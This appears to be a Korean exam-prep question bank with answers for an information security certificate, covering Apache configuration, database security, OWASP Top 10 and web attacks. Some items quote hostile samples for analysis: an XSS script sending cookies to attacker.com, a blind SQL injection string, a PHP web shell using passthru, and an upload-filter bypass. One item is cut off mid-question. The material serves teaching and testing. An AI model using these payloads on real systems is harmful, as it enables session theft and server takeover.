<strong>정답:</strong> (A) <strong>HTTP 응답 분할(HTTP Response Splitting)</strong>, (B) <strong>CR</strong> (Carriage Return, %0D), (C) <strong>LF</strong> (Line Feed, %0A)
</blockquote>
</details>

<details>
<summary>[기출 13회 5번 문제] (단답형) HTTP 헤더 인젝션 공격 시 사용되는 개행문자(줄바꿈 문자) 두 가지의 약어를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>CR</strong> (\r, Carriage Return), <strong>LF</strong> (\n, Line Feed)<br>
<strong>해석:</strong> HTTP 프로토콜에서 헤더 구분을 위해 사용하는 제어 문자를 악용하여 서버의 응답을 조작하는 공격이다.
</blockquote>
</details>

<details>
<summary>[491] (단답형) 모바일 웹이나 앱에서 특정 페이지로 직접 이동하기 위해 사용하는 링크 기술로, 적절한 검증이 없을 경우 권한 없는 동작이 실행될 수 있는 취약점을 무엇이라 하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>딥링크(Deeplink)</strong> 취약점
</blockquote>
</details>

<details>
<summary>[기출 13회 12번 문제] (단답형) 모바일 앱에서 악성 링크를 통해 특정 위치로 직접 이동시키는 공격에 악용 가능한 기술로, 앱 내부의 특정 지점으로 유도하는 링크 기술의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>딥링크 (DeepLink)</strong><br>
<strong>해설:</strong> 안드로이드나 iOS 앱에서 특정 페이지나 기능으로 바로 이동할 수 있게 해주는 URL 스키마 기술로, 공격자가 이를 변조하여 피싱이나 무단 기능 실행에 악용할 수 있음.
</blockquote>
</details>

<details>
<summary>[505] (작업형) Apache 웹 서버에서 브라우저를 통해 디렉토리 내의 파일 목록이 노출되는 **디렉토리 리스팅(Directory Listing)** 취약점을 방지하기 위해 <code>httpd.conf</code> 파일의 <code>Options</code> 지시자에서 제거해야 할 옵션 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>Indexes</strong> (또는 <code>-Indexes</code>로 설정)
</blockquote>
</details>

<details>
<summary>[506] (작업형) Apache 웹 서버에서 업로드 파일 크기를 제한하여 서비스 거부 공격(DoS) 등을 예방하고자 할 때 사용하는 지시자를 쓰시오.(예: 5MB로 제한 시 <code>( A ) 5000000</code>)</summary>
<blockquote>
<strong>정답:</strong> <strong>LimitRequestBody</strong>
</blockquote>
</details>

<details>
<summary>[510] (단답형) 웹 사이트의 루트 디렉토리에 위치하며, 검색엔진의 크롤링 로봇이 접근할 수 있는 범위를 지정하여 중요한 정보가 검색 결과에 노출되지 않도록 설정하는 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>robots.txt</strong>
</blockquote>
</details>

<details>
<summary>[기출 24회 6번 문제] (단답형) 웹 크롤러의 접근 제어를 위한 국제 표준으로, 민감한 디렉토리나 관리자 페이지에 대한 크롤링을 제한하여 보안을 강화하는 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>robots.txt</strong><br>
<strong>해설:</strong> robots.txt를 통해 검색 엔진 최적화(SEO)와 웹사이트 보안을 동시에 관리할 수 있습니다.
</blockquote>
</details>

<details>
<summary>[509] (작업형) Apache 웹 서버의 배너 정보를 최소화하여 공격자에게 불필요한 OS 및 모듈 정보를 노출하지 않도록 설정할 때, <code>ServerTokens</code> 지시자에 권장되는 설정값을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>Prod</strong> (또는 ProductOnly)
</blockquote>
</details>

<details>
<summary>[520] (분석/작업형) 다음 Apache **access_log**의 각 필드가 의미하는 바를 쓰시오.<br>
<code>200.100.50.25 - - [13/Sep/2023:11:00:00 +0900] "GET /index.php HTTP/1.1" 200 234 "http://www.algisa.com/a.asp" "Mozilla/5.0…"</code><br>
1) <code>"GET /index.php HTTP/1.1"</code>: <strong>( A )</strong><br>
2) <code>200</code>: <strong>( B )</strong><br>
3) <code>"http://www.algisa.com/a.asp"</code>: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>요청 라인(Request Line)</strong>, (B) <strong>상태 코드(Status Code)</strong>, (C) <strong>Referer</strong> (이전 페이지 정보)
</blockquote>
</details>

<details>
<summary>[기출 24회 10번 문제] (단답형) 아파치 웹 서버의 로그 분석 시 확인할 수 있는 정보 중 다음 설명에 해당하는 요소를 쓰시오.<br>
(1) 클라이언트의 의도(메소드, URI)를 파악할 수 있는 부분<br>
(2) 서버의 응답 상태를 나타내는 정보<br>
(3) 트래픽의 출처를 추적할 수 있는 정보</summary>
<blockquote>
<strong>정답:</strong> (1): <strong>요청라인 (Request Line)</strong>, (2): <strong>상태코드 (Status Code)</strong>, (3): <strong>Referer 정보</strong><br>
<strong>해설:</strong> 아파치 로그 분석은 보안 모니터링과 사고 대응에 핵심적인 역할을 합니다.
</blockquote>
</details>

<details>
<summary>[524] (작업형) **컴퓨터 범죄(Cyber Crime)**의 주요 수법에 대한 설명으로 빈칸을 채우시오.<br>
1) 원시 데이터(Source Data)를 입력할 때 고의로 위·변조하거나 다른 데이터로 바꾸어 넣는 수법: <strong>( A )</strong><br>
2) 이자 계산 등에서 발생하는 소수점 이하의 단수(端數)를 특정 계좌로 조금씩 모아 거액을 횡령하는 수법: <strong>( B )</strong><br>
3) 정상적인 통신 채널에 기생하여 보이지 않게 메시지를 숨겨서 전달하는 은닉 통로: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>데이터 디들링(Data Diddling)</strong>, (B) <strong>살라미(Salami)</strong> 기법, (C) <strong>은닉 채널(Covert Channel)</strong>
</blockquote>
</details>

<details>
<summary>[530] (단답형) 특정 날짜나 시간, 혹은 특정 조건이 충족될 때 악의적인 기능을 수행하도록 프로그램 내에 삽입된 코드를 무엇이라 하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>논리 폭탄(Logic Bomb)</strong>
</blockquote>
</details>

<details>
<summary>[기출 24회 2번 문제] (단답형) 다음 데이터베이스 암호화 방식에 해당하는 용어를 각각 쓰시오.<br>
(A) 애플리케이션 레벨에서 유연한 구현이 가능하나 성능 오버헤드가 있을 수 있는 방식<br>
(B) DBMS와 독립적으로 운영되며 확장성이 좋은 방식<br>
(C) DBMS 엔진 레벨에서 동작하여 애플리케이션 수정 없이 투명한 암호화를 제공하는 방식</summary>
<blockquote>
<strong>정답:</strong> (A): <strong>API 방식</strong>, (B): <strong>Plug-In 방식</strong>, (C): <strong>TDE (Transparent Data Encryption)</strong><br>
<strong>해설:</strong> 데이터베이스 암호화는 구현 방식에 따라 다양한 장단점이 있습니다. API 방식은 애플리케이션 레벨에서, Plug-In 방식은 DBMS 외부 모듈로, TDE는 DBMS 엔진 내부에서 동작합니다.
</blockquote>
</details>

<details>
<summary>[538] (작업형) **데이터베이스(DB) 보안** 위협 모델에 대한 설명으로 빈칸을 채우시오.<br>
1) 낮은 보안 등급의 정보들을 조각별로 조합하여 높은 등급의 정보를 알아내는 방식: <strong>( A )</strong><br>
2) 보안 등급이 없는 사용자가 기밀 정보에 대해 직접 접근하지 않고, 일반적인 질의를 통해 연역적으로 기밀 정보를 추턴해 내는 행위: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>집성(Aggregation)</strong>, (B) <strong>추론(Inference)</strong>
</blockquote>
</details>

<details>
<summary>[기출 12회 4번 문제] (단답형) 데이터베이스의 보안 위협과 관련된 다음 설명이 의미하는 용어를 각각 쓰시오.
1) 낮은 보안 등급의 정보 조각들을 조합하여 민감한 정보를 알아내는 기법: <strong>( A )</strong><br>
2) 일반적인 데이터에 접근하여 통계적인 분석 등을 통해 기밀 정보를 유추해내는 공격: <strong>( B )</strong><br>
3) 데이터를 입력하거나 출력하는 과정에서 원본 데이터를 교묘하게 수정하여 결과를 조작하는 행위: <strong>( C )</strong>
</summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>집성 (Aggregation)</strong><br>
(B) <strong>추론 (Inference)</strong><br>
(C) <strong>데이터 디들링 (Data Diddling)</strong>
</blockquote>
</details>

<details>
<summary>[기출 13회 17번 문제] (서술형) Oracle DBMS의 접근 권한 설정 미흡과 관련하여 다음 물음에 답하시오.
1) 일반 사용자에게 과도한 권한(예: DBA 권한 등)이 부여되었을 때 발생할 수 있는 보안 문제점은?<br>
2) 중요 데이터에 대해 'AUDIT' 설정을 누락했을 때의 문제점은?<br>
3) 롤(Role)을 사용하여 일반 사용자에게 최소한의 조회 권한만 부여하는 SQL 예시를 작성하시오.
</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>권한 남용:</strong> 권한 오남용을 통해 중요 데이터 유출 및 무단 변경(변조, 삭제) 가능성 증대<br>
2) <strong>책임 추적성 결여:</strong> 중요 데이터 접근 및 행위 기록이 없어 침해 사고 발생 시 원인 규명 및 책임소재 파악 불가<br>
3) <strong>SQL 예시:</strong><br>
<code>CREATE ROLE ROLE_NAME;</code><br>
<code>GRANT SELECT ON TABLE_NAME TO ROLE_NAME;</code><br>
<code>GRANT ROLE_NAME TO USERNAME;</code>
</blockquote>
</details>

<details>
<summary>[541] (서술형) 데이터베이스 보안 통제 방법 중 **접근 통제(Access Control)**와 **흐름 통제(Flow Control)**의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>접근 통제</strong>: 사용자의 권한에 따라 데이터베이스 내의 특정 데이터 객체(테이블, 뷰 등)에 대한 접근 여부를 제어한다.<br>
- <strong>흐름 통제</strong>: 데이터가 보안 등급이 높은 객체에서 낮은 객체로 흐르는 것을 방지하여 정보 노출을 차단한다.
</blockquote>
</details>

<details>
<summary>[540] (작업형) 데이터베이스 권한 관리를 위한 **DCL(Data Control Language)**에 대한 설명으로 빈칸을 채우시오.<br>
1) 사용자에게 객체에 대한 권한을 부여하는 명령어: <strong>( A )</strong><br>
2) 기 부여된 권한을 회수 및 해제하는 명령어: <strong>( B )</strong><br>
3) 부여된 권한과 중복될 경우 우선권을 가지며 권한을 명시적으로 금지하는 명령어: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>GRANT</strong>, (B) <strong>REVOKE</strong>, (C) <strong>DENY</strong>
</blockquote>
</details>

<details>
<summary>[548] (서술형) **MySQL** 데이터베이스를 Linux 환경에서 운영할 때, 외부 네트워크의 접근을 차단하고 로컬 설치 앱에서만 접근할 수 있도록 <code>my.cnf</code> 파일에 설정해야 하는 옵션 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>skip-networking</strong> (<code>[mysqld]</code> 섹션에 추가)
</blockquote>
</details>

<details>
<summary>[549] (단답형) MySQL에서 서비스를 중단하지 않고 데이터베이스를 백업할 수 있는 커맨드라인 도구의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>mysqldump</strong>
</blockquote>
</details>

<details>
<summary>[542] (작업형) **데이터베이스 암호화 방식** 에 대한 설명으로 빈칸을 채우시오.<br>
1) 애플리케이션 수정이 필요 없으며, DB 서버에 암호화 모듈을 설치하여 처리하는 방식: <strong>( A )</strong><br>
2) 애플리케이션 레벨에서 암호화 API를 호출하여 처리하며, DBMS 부하를 줄일 수 있는 방식: <strong>( B )</strong><br>
3) DBMS에 내장된 기능을 사용하여 스토리지 저장 시 자동으로 암호화하는 방식: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Plug-In 방식</strong>, (B) <strong>API 방식</strong>, (C) <strong>TDE (Transparent Data Encryption) 방식</strong>
</blockquote>
</details>

<details>
<summary>[543] (단답형) **SET(Secure Electronic Transaction)** 프로토콜에서 상점은 고객의 결제 정보를 볼 수 없고, 금융기관은 고객의 주문 내용을 볼 수 없도록 하여 개인정보를 보호하는 핵심 기술 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>이중 서명(Dual Signature)</strong>
</blockquote>
</details>

<details>
<summary>[547] (단답형) 제3자 프로그램이 리소스 소유자를 대신하여 리소스 서버의 자원에 제한적으로 접근할 수 있도록 권한을 위임하는 개방형 표준 프로토콜에서, 일정 기간 접근 권한을 증명하는 문자열을 무엇이라 하는지 쓰시오.</summary>
<blockquote>
정답: <strong>액세스 토큰(Access Token)</strong> (프로토콜: OAuth 2.0)
</blockquote>
</details>

<details>
<summary>[421] (분석/작업형) 다음은 윈도우 PC 점검 결과이다. 질문에 답하시오.<br>
<code>C:\> ipconfig /displaydns</code><br>
<code>Record Name: www.naver.com</code><br>
<code>Record Type: 1</code><br>
<code>A(host) Record: 172.16.3.200</code><br>
(* 실제 <code>www.naver.com</code> 주소는 <code>223.130.195.95</code>임)<br>
1) 의심되는 공격 명칭을 쓰시오.<br>
2) 이 공격에 대응하기 위해 중요한 사이트의 IP를 우선적으로 조회하게 할 수 있는 로컬 파일 경로를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 1) <strong>DNS 스푸핑(Spoofing)</strong>, 2) <strong>C:\Windows\System32\drivers\etc\hosts</strong> (hosts 파일)
</blockquote>
</details>

<details>
<summary>[549] (단답형) OWASP Top 10:2021에서 새롭게 1위로 선정되었으며, 사용자의 권한을 부적절하게 검증하여 허가되지 않은 데이터나 기능에 접근할 수 있게 되는 취약점의 명칭을 영문으로 쓰시오.</summary>
<blockquote>
<code>Broken Access Control</code> (취약한 접근 통제)
</blockquote>
</details>

<details>
<summary>[550] (단답형) OWASP Top 10:2021에서 새롭게 추가된 취약점 중 하나로, 공격자가 조작된 요청을 보내 서버 내부의 자원이나 외부 시스템과 통신하게 만듦으로써 정보 유출이나 내부 시스템 침투를 유도하는 공격의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>SSRF</code> (Server-Side Request Forgery)
</blockquote>
</details>

<details>
<summary>[551] (서술형) OWASP Top 10:2021에서 기존의 'Sensitive Data Exposure'에서 명칭이 변경되며 범주가 확장된 취약점의 명칭(A)과, 이를 방어하기 위해 데이터 전송 시 필수적으로 적용해야 하는 암호화 프로토콜(B)을 쓰시오.</summary>
<blockquote>
(A) <code>Cryptographic Failures</code> (암호화 결함)<br>
(B) <code>TLS</code> (Transport Layer Security) 1.2 이상
</blockquote>
</details>

<details>
<summary>[552] (서술형) OWASP Top 10:2021에서 새롭게 정의된 <strong>Insecure Design</strong>(안전하지 않은 설계)의 특징을 구현 단계의 취약점과 비교하여 서술하고, 이를 예방하기 위해 설계 단계에서 수행해야 할 보안 활동을 1가지 제시하시오.</summary>
<blockquote>
<strong>특징</strong>: 소스코드 상의 구현 실수(Coding Error)보다는 비즈니스 로직이나 시스템 아키텍처 자체의 보안 고려사항이 누락되어 발생하는 근본적인 취약점을 의미한다.<br>
<strong>보안 활동</strong>: <code>위협 모델링 (Threat Modeling)</code>을 통해 설계 단계에서 잠재적인 보안 위험을 사전에 분석하고 완화 대책을 마련해야 한다.
</blockquote>
</details>

<details>
<summary>[553] (단답형) OWASP Top 10:2021의 A08 항목인 <strong>Software and Data Integrity Failures</strong>(소프트웨어 및 데이터 무결성 결함)에 포함되며, 신뢰할 수 없는 데이터로부터 객체를 복원할 때 악성 코드가 실행될 수 있는 취약점의 영문 명칭을 쓰시오.</summary>
<blockquote>
<code>Insecure Deserialization</code> (안전하지 않은 역직렬화)
</blockquote>
</details>

<details>
<summary>[554] (작업형) 다음 빈칸 (A), (B)에 들어갈 알맞은 취약점 항목을 OWASP Top 10:2021 기준으로 작성하시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
<strong>[상황 및 점검 항목]</strong><br>
- (A) 항목: 웹 서버 및 데이터베이스 서버의 기본 계정 미변경, 불필요한 서비스 활성화, 디렉터리 리스팅 허용 등 설정 상의 허점으로 인해 발생하는 취약점이다.<br>
- (B) 항목: 보안 이벤트에 대한 로그를 남기지 않거나, 이상 징후를 실시간으로 감지하지 못해 공격자의 침투를 적시에 인지하지 못하게 되는 취약점이다.
</div>
</summary>
<blockquote>
(A) <code>Security Misconfiguration</code> (보안 설정 오류)<br>
(B) <code>Security Logging and Monitoring Failures</code> (보안 로깅 및 모니터링 실패)
</blockquote>
</details>

<details>
<summary>[555] (응용/서술형) 프로젝트 팀에서 사용하는 오픈소스 라이브러리에 알려진 보안 취약점(CVE)이 패치되지 않은 채 그대로 사용되고 있다. 이와 관련된 OWASP Top 10:2021 취약점 항목 명칭과, 이를 관리하기 위한 자동화된 도구(SCA 등)의 활용 목적을 서술하시오.</summary>
<blockquote>
<strong>항목 명칭</strong>: <code>Vulnerable and Outdated Components</code> (취약하고 오래된 구성 요소)<br>
<strong>활용 목적</strong>: 프로젝트에서 사용하는 모든 서드파티 라이브러리의 목록(BOM)을 작성하고, 알려진 취약점 데이터베이스와 대조하여 보안 업데이트가 필요한 구성 요소를 실시간으로 파악하고 관리하기 위함이다.
</blockquote>
</details>(Passive Mode) 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원인</strong>: 능동 모드는 서버가 클라이언트로 데이터를 전송하기 위해 역으로 접속을 시도하는데, 클라이언트 측 방화벽(또는 NAT)에서 인바운드 접속이 차단되어 데이터 채널 형성이 실패한다.<br>
- <strong>해결 방안</strong>: 클라이언트가 서버에 지정된 포트로 접속을 시도하는 수동 모드(Passive Mode)를 사용하여 방화벽 차단 문제를 해결할 수 있다.
</blockquote>
</details>

<details>
<summary>[454] (서술형) SNMP(Simple Network Management Protocol) 서비스 운영 시 보안을 강화하기 위한 대책 4가지를 제시하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) 사용하지 않는 경우 SNMP 서비스를 비활성화한다.<br>
2) <code>public</code>, <code>private</code> 등 기본 설정된 **Community String**을 유추하기 어려운 복잡한 문자열로 변경한다.<br>
3) 인증 및 암호화 기능을 제공하는 **SNMPv3**를 사용하여 통신한다.<br>
4) 관리 시스템(NMS)의 IP를 등록하여 해당 IP에서만 SNMP 요청을 허용하도록 ACL을 설정한다.
</blockquote>
</details>

<details>
<summary>[470] (작업형) **이메일 보안 표준**에 대한 설명으로 빈칸을 채우시오.<br>
1) 발신 도메인의 DNS에 등록된 허용 IP와 실제 발신자 IP를 대조하여 위장 여부를 확인하는 기술: <strong>( A )</strong><br>
2) 발신자의 디지털 서명을 메일 헤더에 삽입하고 수신 측에서 DNS의 공개키로 검증하는 기술: <strong>( B )</strong><br>
3) 위 두 기술의 검증 결과에 따라 수신 측에서 메일을 어떻게 처리할지(거부/격리 등) 정책을 정의하는 기술: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>SPF (Sender Policy Framework)</strong>, (B) <strong>DKIM (DomainKeys Identified Mail)</strong>, (C) <strong>DMARC</strong>
</blockquote>
</details>

<details>
<summary>[473] (분석형) 다음 이메일 로그 정보의 의미를 쓰시오.<br>
<code>cipher=ECDHE-RSA-AES128-GCM-SHA256</code><br>
1) **RSA**의 용도: <strong>( A )</strong><br>
2) **AES128**의 용도: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>인증(Digital Signature) 및 키 교환</strong>, (B) <strong>데이터의 대칭키 암호화</strong>
</blockquote>
</details>

<details>
<summary>[554] (분석형) 다음 HTTP 요청 헤더 정보가 포함된 패킷이 초당 수천 개씩 웹 서버로 전달되고 있다. 공격의 명칭과 목적을 쓰시오.<br>
<code>GET /index.jsp HTTP/1.1</code><br>
<code>Referer: http://www.attacker.com/link.html</code><br>
<code>Cache-Control: max-age=0</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>HTTP Cache-Control (CC) 공격</strong> (또는 HTTP GET Flooding with Cache-Control)<br>
- <strong>공격 목적</strong>: <code>max-age=0</code> 옵션을 통해 캐시 서버의 데이터를 무시하고 웹 서버가 매번 새로운 응답을 생성하도록 강제함으로써, 캐시 서버를 무력화하고 웹 서버에 과부하를 유발하는 DoS 공격이다.
</blockquote>
</details>

<details>
<summary>[483] (서술형) **SQL 인젝션** 공격을 방지하기 위한 대표적인 기법인 **Prepared Statement**의 원리와 보안 효과를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원리</strong>: SQL 쿼리 문장을 미리 컴파일하여 구조를 확정 지은 뒤, 사용자의 입력값은 쿼리 구조에 영향을 주지 않는 단순 파라미터(바인딩 변수)로만 처리하는 방식이다.<br>
- <strong>보안 효과</strong>: 입력값에 포함된 특수문자나 SQL 예약어가 쿼리의 논리적 구조를 변경할 수 없으므로 SQL 인젝션을 근본적으로 차단할 수 있다.
</blockquote>
</details>

<details>
<summary>[486] (분석형) 다음은 보안 관제 중 발견된 공격 시도이다. 질문에 답하시오.<br>
<code>test.php?no=0 or ascii(substr((select table_name from information_schema.tables …),1,1))=65#</code><br>
1) 공격의 구체적인 명칭을 쓰시오.<br>
2) 위 쿼리에서 <code>65</code>의 의미는 무엇인지 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 1) <strong>Blind SQL Injection</strong> (블라인드 SQL 인젝션), 2) 추출하려는 데이터(테이블 명 등)의 첫 번째 문자의 ASCII 값이 '65'(대문자 'A')인지 확인하여 참/거짓 여부를 판별하기 위함이다.
</blockquote>
</details>

<details>
<summary>[476] (서술형) **XSS(Cross Site Scripting)**와 **CSRF(Cross Site Request Forgery)**의 주요 차이점을 공격 대상과 실행 위치 관점에서 비교 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>XSS</strong>: 악성 스크립트가 사용자의 브라우저에서 실행되어 **클라이언트(사용자)**의 정보(쿠키, 세션 등)를 유출하거나 조작하는 것이 목적이다.<br>
- <strong>CSRF</strong>: 사용자의 권한을 이용하여 **서버**에 의도하지 않은 요청(비밀번호 변경, 게시글 작성 등)을 강제로 보내는 공격으로, 서버 측의 기능 수행이 목적이다.
</blockquote>
</details>

<details>
<summary>[504] (분석/작업형) 게시판에 다음 스크립트가 포함된 게시물이 업로드되었다. 질문에 답하시오.<br>
<code>&lt;script&gt; var img = new Image(); img.src = "http://attacker.com/collect.php?c=" + document.cookie; &lt;/script&gt;</code><br>
1) 이 스크립트의 실행 결과는 무엇인가?<br>
2) 이를 방지하기 위한 웹 애플리케이션 측 대응 방안 1가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 1) 게시물을 열람한 사용자의 <strong>쿠키 정보</strong>가 공격자의 서버로 전송된다. 2) 쿠키에 <strong>HttpOnly</strong> 속성을 설정하거나, 사용자 입력값의 특수문자(<code>&lt;</code>, <code>&gt;</code> 등)를 <strong>HTML Entity</strong>로 치환(Encoding)하여 출력한다.
</blockquote>
</details>

<details>
<summary>[485] (서술형) 파일 업로드 취약점을 방지하기 위해 아파치(Apache) 설정 파일(<code>.htaccess</code>)에서 **특정 확장자의 실행을 차단**하거나 **MIME 타입을 강제로 변경**하는 설정의 예를 한 가지씩 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>실행 차단</strong>: <code>&lt;FilesMatch "\.(php|inc|lib)"&gt; Deny from all &lt;/FilesMatch&gt;</code> (해당 확장자 파일에 대한 접근/실행 거부)<br>
2) <strong>MIME 타입 변경</strong>: <code>AddType text/html .php</code> (PHP 파일을 실행하지 않고 서버에서 일반 텍스트/HTML로 인식하게 함)
</blockquote>
</details>

<details>
<summary>[기출 19회 15번 문제] (실무형) 파일 업로드 취약점 방지를 위해 <code>.htaccess</code> 파일에 적용된 다음 설정의 의미를 설명하시오.<br>
1) <code>&lt;FilesMatch "\.(ph|lib|sh|)"&gt; order Allow,Deny Deny From ALL &lt;/FilesMatch&gt;</code><br>
2) <code>AddType text/plain .php .php1 .php2</code></summary>
<blockquote>
1) <strong>의미</strong>: <code>.php</code>, <code>.lib</code>, <code>.sh</code> 등의 확장자를 가진 모든 파일에 대해 직접적인 웹 접근(다운로드 및 실행)을 전면 차단함<br>
2) <strong>의미</strong>: 해당 확장자를 가진 파일을 실행 스크립트로 인식하지 않고 일반 <strong>텍스트 파일(MIME 타입)</strong>로 강제 지정하여 웹 서버 상에서 실행되지 않도록 방지함
</blockquote>
</details>

<details>
<summary>[485] (분석/서술형) 다음 PHP 업로드 로직의 취약점과 우회 기법을 설명하시오.<br>
<code>$file_type = $_FILES['upfile']['type'];</code><br>
<code>$white_list = array('image/gif', 'image/jpeg');</code><br>
<code>if(in_array($file_type, $white_list)) { … }</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>취약점</strong>: 클라이언트가 전송하는 <strong>MIME 타입(Content-Type 헤더)</strong> 정보에만 의존하여 검사하므로, 파일의 실제 확장자나 내용을 검증하지 않는 취약점이 있다.<br>
- <strong>우회 기법</strong>: 공격자가 웹쉘(<code>.php</code>)을 업로드하면서 프록시 도구를 이용해 HTTP 요청 헤더의 <code>Content-Type</code>을 <code>image/jpeg</code>로 조작하여 전송하면 보안 검사를 통과할 수 있다.
</blockquote>
</details>

<details>
<summary>[492] (단답형) 웹 애플리케이션에서 입력값에 대한 적절한 검증 없이 <code>../../</code>와 같은 상위 디렉토리 이동 문자를 사용하여 시스템의 중요 파일(예: <code>/etc/passwd</code>)에 접근하는 공격 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>디렉토리 트래버스(Directory Traversal)</strong> (또는 경로 조작 공격)
</blockquote>
</details>

<details>
<summary>[507] (분석/작업형) 다음 PHP 악성코드(웹쉘) 로그의 일부이다. 질문에 답하시오.<br>
<code>echo "&lt;div&gt;&lt;textarea name='report'&gt;";</code><br>
<code>passthru($_POST['cmd']);</code><br>
<code>echo "&lt;/textarea&gt;&lt;/div&gt;";</code><br>
1) <code>passthru()</code> 함수의 기능을 설명하시오.<br>
2) 이와 유사한 기능을 수행하는 PHP 함수 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>기능</strong>: 외부의 <strong>운영체제(OS) 명령어를 실행</strong>하고 그 결과를 직접 브라우저로 출력하는 함수이다.<br>
2) <strong>유사 함수</strong>: <code>exec()</code>, <code>system()</code>, <code>shell_exec()</code> (등)
</blockquote>
</details>

<details>
<summary>[505] (분석/작업형) 웹 사이트 접속 시 특정 디렉토리에 <code>index.html</code> 등 인덱스 파일이 없을 경우 디렉토리 내의 파일 목록이 브라우저에 노출되는 취약점의 명칭과 아파치(Apache) 설정에서의 대응 방법을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>취약점 명칭</strong>: <strong>디렉토리 리스팅(Directory Listing)</strong> (또는 디렉토리 인덱싱 취약점)<br>
- <strong>대응 방법</strong>: <code>httpd.conf</code> 설정 파일의 <code>&lt;Directory&gt;</code> 섹션에서 <code>Options</code> 지시자의 <strong>Indexes</strong> 설정을 제거하거나 <strong>-Indexes</strong>로 설정한다.
</blockquote>
</details>

<details>
<summary>[505] (서술형) 아파치(Apache) 설정 중 **FollowSymLinks** 옵션의 보안상 위험성과 이를 방지하기 위한 설정 방법을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>위험성</strong>: 웹 루트 디렉토리 내에 시스템 파일(예: <code>/etc/passwd</code>)로 연결된 <strong>심볼릭 링크</strong>가 존재할 경우, 공격자가 웹을 통해 해당 시스템 중요 파일의 내용에 직접 접근할 수 있는 위험이 있다.<br>
- <strong>설정 방법</strong>: <code>Options</code> 지시자에서 <strong>-FollowSymLinks</strong>를 설정하여 심볼릭 링크를 따라가지 않도록 제한한다.
</blockquote>
</details>

<details>
<summary>[509] (단답형) 아파치(Apache) 설정 시 웹 서버의 정보(버전, OS 등)를 최소한으로 노출하기 위해 설정해야 할 다음 지시자의 적절한 값을 쓰시오.<br>
1) <code>ServerTokens</code>: <strong>( A )</strong><br>
2) <code>ServerSignature</code>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Prod</strong> (또는 ProductOnly), (B) <strong>Off</strong>
</blockquote>
</details>

<details>
<summary>[561] (서술형) 아파치 설정 중 **KeepAlive** 옵션의 의미와 대량의 접속이 발생하는 서버에서의 설정 시 고려사항을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>의미</strong>: 한 번 연결된 **TCP 커넥션을 끊지 않고 유지**하여 여러 개의 HTTP 요청을 처리할 수 있게 하는 기능이다.<br>
- <strong>고려사항</strong>: 접속자가 매우 많은 경우 빈 커넥션이 프로세스를 계속 점유하여 **메모리 부족** 현상이 발생할 수 있으므로, <code>KeepAliveTimeout</code>을 짧게 설정하고 <code>MaxKeepAliveRequests</code>를 적절히 조절해야 한다.
</blockquote>
</details>

<details>
<summary>[561] (분석형) 다음 아파치 **Order** 지시자에 따른 접근 제어 결과를 쓰시오.<br>
1) <code>Order Allow,Deny</code> | <code>Allow from all</code> | <code>Deny from 192.168.1.1</code><br>
2) <code>Order Deny,Allow</code> | <code>Deny from all</code> | <code>Allow from 192.168.1.1</code></summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>192.168.1.1을 제외한 모든 IP 허용</strong> (Allow를 먼저 평가한 후 Deny를 평가하며, 마지막에 명시된 Deny 조건이 적용됨)<br>
2) <strong>192.168.1.1만 허용</strong> (Deny를 먼저 평가한 후 Allow를 평가하며, 마지막에 명시된 Allow 조건이 적용됨)
</blockquote>
</details>

<details>
<summary>[520] (분석형) 다음 아파치 **access_log**의 각 항목이 의미하는 바를 쓰시오.<br>
<code>192.168.10.5 - - [13/Sep/2024:11:00:00 +0900] "GET /index.jsp HTTP/1.1" 200 1234 "http://referer.com" "Mozilla/5.0…"</code><br>
1) <strong>200</strong>: <strong>( A )</strong><br>
2) <strong>1234</strong>: <strong>( B )</strong><br>
3) <strong>"http://referer.com"</strong>: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>HTTP 응답 상태 코드</strong> (성공), (B) <strong>응답 데이터의 크기(Byte)</strong>, (C) <strong>Referer</strong> (요청이 발생한 이전 페이지의 URL)
</blockquote>
</details>

<details>
